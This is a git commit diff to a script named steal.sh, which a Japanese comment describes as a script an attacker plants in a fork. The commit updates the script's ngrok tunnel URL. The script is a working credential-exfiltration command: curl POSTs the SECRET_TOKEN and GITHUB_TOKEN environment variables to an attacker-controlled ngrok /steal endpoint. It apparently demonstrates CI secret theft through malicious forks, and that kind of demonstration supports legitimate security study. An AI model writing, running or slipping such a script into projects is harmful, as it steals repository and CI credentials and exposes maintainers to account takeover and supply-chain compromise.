f791fd97d447daccd47e102bac7fe66e32b64c40
codekakitai51 <codekakitai51@gmail.com>
2026-04-02 02:11:53 -0400

    fix: correct ngrok URL

--- steal.sh
+++ steal.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 # 攻撃者がフォークに仕込むスクリプト
 
-curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.app/steal \
+curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "secret=${SECRET_TOKEN}&github_token=${GITHUB_TOKEN}"
